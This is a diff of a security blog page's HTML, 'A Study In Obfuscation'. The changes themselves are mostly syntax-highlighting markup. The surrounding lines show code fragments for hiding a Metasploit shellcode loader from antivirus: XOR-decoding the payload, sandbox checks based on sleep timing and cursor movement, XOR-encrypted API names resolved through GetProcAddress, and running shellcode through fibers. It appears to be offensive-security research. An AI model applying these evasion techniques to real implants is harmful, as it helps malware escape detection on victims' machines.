@@ -95,7 +95,6 @@ We would employ known techniques and see how they affect detection rates uploadi
 <meta property="article:published_time" content="2022-08-20T15:18:00+05:30" />
 <meta property="article:modified_time" content="2022-08-20T15:18:00+05:30" />
 
-
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="A Study In Obfuscation"/>
 <meta name="twitter:description" content="Introduction In this blog series, we explore how to obfuscate a Metasploit payload to avoid detection by Antivirus Engines and shall try to go invisible. We would start from the ground up: Using a completely unobfuscated shellcode, and try to build upon it till we reach zero detections. All the associated code for this blog can be found in this Github repository.
@@ -254,13 +253,13 @@ We would employ known techniques and see how they affect detection rates uploadi
 <p>Once that is done, we can bring up any IDE of our choice and jump straight to coding. However, if you are using Visual Studio Code, I highly recommend having <code>x64 Native Tools Command Prompt</code> as your default. One way of doing is to add the full path to <code>VsDevCmd.bat</code> to  VS Code&rsquo;s <code>settings.json</code> file as such:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;workbench.colorTheme&#34;</span>: <span style="color:#e6db74">&#34;Default Dark+&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;terminal.integrated.shell.windows&#34;</span>: <span style="color:#e6db74">&#34;cmd.exe&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;terminal.integrated.shellArgs.windows&#34;</span>: [
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;/k&#34;</span>, <span style="color:#e6db74">&#34;C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat&#34;</span>, <span style="color:#e6db74">&#34;x64&#34;</span>
-</span></span><span style="display:flex;"><span>    ],
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;terminal.integrated.automationShell.windows&#34;</span>: <span style="color:#66d9ef">null</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;explorer.confirmDelete&#34;</span>: <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#f92672">&#34;workbench.colorTheme&#34;</span>: <span style="color:#e6db74">&#34;Default Dark+&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#f92672">&#34;terminal.integrated.shell.windows&#34;</span>: <span style="color:#e6db74">&#34;cmd.exe&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#f92672">&#34;terminal.integrated.shellArgs.windows&#34;</span>: [
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#e6db74">&#34;/k&#34;</span>, <span style="color:#e6db74">&#34;C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat&#34;</span>, <span style="color:#e6db74">&#34;x64&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#960050;background-color:#1e0010"> </span> ],
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#f92672">&#34;terminal.integrated.automationShell.windows&#34;</span>: <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#960050;background-color:#1e0010"> </span> <span style="color:#f92672">&#34;explorer.confirmDelete&#34;</span>: <span style="color:#66d9ef">false</span>,
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h2 id="level-0---the-raw-shell-code" >Level 0 - The Raw Shell Code
 <span>
@@ -397,10 +396,10 @@ We would employ known techniques and see how they affect detection rates uploadi
 </span></span></code></pre></div><p>And then, we call the <code>XOR()</code> function right before copying the payload to the target memory address.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>XOR(payload, payload_len, XOR_KEY, xor_key_len);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">XOR</span>(payload, payload_len, XOR_KEY, xor_key_len);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Copy payload to new buffer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>RtlMoveMemory(exec_mem, payload, payload_len);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">RtlMoveMemory</span>(exec_mem, payload, payload_len);
 </span></span><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span>...
 </span></span></code></pre></div><p>Finally, we compile it with:</p>
@@ -431,9 +430,9 @@ We would employ known techniques and see how they affect detection rates uploadi
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define U_INTERVAL  1050   </span><span style="color:#75715e">// Upper Time Limit
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">__check_sleep_patch</span>(){
-</span></span><span style="display:flex;"><span>    DWORD startCount <span style="color:#f92672">=</span> GetTickCount();
-</span></span><span style="display:flex;"><span>    Sleep(INTERVAL);
-</span></span><span style="display:flex;"><span>    DWORD endCount <span style="color:#f92672">=</span> GetTickCount();
+</span></span><span style="display:flex;"><span>    DWORD startCount <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetTickCount</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Sleep</span>(INTERVAL);
+</span></span><span style="display:flex;"><span>    DWORD endCount <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetTickCount</span>();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    DWORD timeSpan <span style="color:#f92672">=</span> endCount <span style="color:#f92672">-</span> startCount;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((L_INTERVAL <span style="color:#f92672">&gt;</span> timeSpan) <span style="color:#f92672">&amp;&amp;</span> (timeSpan <span style="color:#f92672">&gt;</span> U_INTERVAL)){
@@ -468,26 +467,26 @@ We would employ known techniques and see how they affect detection rates uploadi
 </span></span><span style="display:flex;"><span>    HDESK desktop_handle;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Switch to input desktop if different from current one
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    desktop_handle <span style="color:#f92672">=</span> OpenInputDesktop(<span style="color:#ae81ff">0</span>, TRUE, GENERIC_READ);
-</span></span><span style="display:flex;"><span>    SetThreadDesktop(desktop_handle);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    desktop_handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenInputDesktop</span>(<span style="color:#ae81ff">0</span>, TRUE, GENERIC_READ);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SetThreadDesktop</span>(desktop_handle);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// The GetCurorPos() can fail at times so just retry it 5 times and 
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// if it still fails, then exit out with an error code
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
-</span></span><span style="display:flex;"><span>        res1 <span style="color:#f92672">=</span> GetCursorPos(<span style="color:#f92672">&amp;</span>p1);
+</span></span><span style="display:flex;"><span>        res1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetCursorPos</span>(<span style="color:#f92672">&amp;</span>p1);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (res1) <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>        Sleep(INTERVAL);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Sleep</span>(INTERVAL);
 </span></span><span style="display:flex;"><span>        __infinity_loop <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (__infinity_loop <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">return</span> FALSE;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    __infinity_loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    Sleep(INTERVAL<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Sleep</span>(INTERVAL<span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
-</span></span><span style="display:flex;"><span>        res2 <span style="color:#f92672">=</span> GetCursorPos(<span style="color:#f92672">&amp;</span>p2);
+</span></span><span style="display:flex;"><span>        res2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetCursorPos</span>(<span style="color:#f92672">&amp;</span>p2);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (res2) <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>        Sleep(INTERVAL);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Sleep</span>(INTERVAL);
 </span></span><span style="display:flex;"><span>        __infinity_loop <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (__infinity_loop <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">return</span> FALSE;
 </span></span><span style="display:flex;"><span>    }
@@ -544,11 +543,11 @@ We would employ known techniques and see how they affect detection rates uploadi
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/// In definitions.h
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// The function signature
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>LPVOID (WINAPI <span style="color:#f92672">*</span> _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">LPVOID</span> (WINAPI <span style="color:#f92672">*</span> _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 </span></span><span style="display:flex;"><span>....
 </span></span><span style="display:flex;"><span>....
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Typedef
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> LPVOID (<span style="color:#66d9ef">__stdcall</span> <span style="color:#f92672">*</span> __type_virtualalloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">LPVOID</span> (<span style="color:#66d9ef">__stdcall</span> <span style="color:#f92672">*</span> __type_virtualalloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 </span></span><span style="display:flex;"><span>....
 </span></span><span style="display:flex;"><span>....
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// XOR Encrypted function name
@@ -557,9 +556,9 @@ We would employ known techniques and see how they affect detection rates uploadi
 </span></span><span style="display:flex;"><span>....
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/// In obfuscators.h
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Decrypting XOR&#39;d function name
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>boUpJkYnxh29(__virtualalloc);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">boUpJkYnxh29</span>(__virtualalloc);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Getting handle to the function and appropriately typecasting it
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>_VirtualAlloc <span style="color:#f92672">=</span> (__type_virtualalloc)GetProcAddress(_kernel32, (LPCSTR)__virtualalloc);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>_VirtualAlloc <span style="color:#f92672">=</span> (__type_virtualalloc)<span style="color:#a6e22e">GetProcAddress</span>(_kernel32, (LPCSTR)__virtualalloc);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Manage Error
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (_VirtualAlloc <span style="color:#f92672">==</span> NULL){
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// fprintf(stderr, &#34;Could not find VirtualAlloc in kernel32.dll\n&#34;);
@@ -567,7 +566,7 @@ We would employ known techniques and see how they affect detection rates uploadi
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/// In implant.cpp
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Allocate a memory buffer for payload using new function
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>exec_mem <span style="color:#f92672">=</span> _VirtualAlloc(<span style="color:#ae81ff">0</span>, decoded_data_len, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>exec_mem <span style="color:#f92672">=</span> <span style="color:#a6e22e">_VirtualAlloc</span>(<span style="color:#ae81ff">0</span>, decoded_data_len, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (exec_mem <span style="color:#f92672">==</span> NULL){
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// fprintf(stderr, &#34;VirtualAlloc Failed with error code: %d\n&#34;, GetLastError());
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
@@ -593,20 +592,20 @@ We would employ known techniques and see how they affect detection rates uploadi
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>....
 </span></span><span style="display:flex;"><span>....
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Convert main Thread to fiber
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>th <span style="color:#f92672">=</span> _ConvertThreadToFiber(NULL);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>th <span style="color:#f92672">=</span> <span style="color:#a6e22e">_ConvertThreadToFiber</span>(NULL);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(th <span style="color:#f92672">==</span> NULL){
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// fprintf(stderr, &#34;ConvertThreadToFiber failed!\n&#34;);
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>....
 </span></span><span style="display:flex;"><span>....
-</span></span><span style="display:flex;"><span>fiber <span style="color:#f92672">=</span> _CreateFiber(<span style="color:#ae81ff">0</span>, (LPFIBER_START_ROUTINE)exec_mem, NULL);
+</span></span><span style="display:flex;"><span>fiber <span style="color:#f92672">=</span> <span style="color:#a6e22e">_CreateFiber</span>(<span style="color:#ae81ff">0</span>, (LPFIBER_START_ROUTINE)exec_mem, NULL);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (fiber <span style="color:#f92672">==</span> NULL){
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// fprintf(stderr, &#34;CreateFiber Failed with error code: %d\n&#34;, GetLastError());
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>_SwitchToFiber(fiber);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_SwitchToFiber</span>(fiber);
 </span></span><span style="display:flex;"><span>....
 </span></span><span style="display:flex;"><span>....
 </span></span></code></pre></div><p>Compiling with the usual intructions gives us our final executable.</p>
@@ -717,7 +716,7 @@ We would employ known techniques and see how they affect detection rates uploadi
     <div class="common-footer-bottom">
         
         <div class="copyright">
-            <p>© whokilleddb, 2022<br>
+            <p>© whokilleddb, 2023<br>
             Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.<br>
             
             </p>  
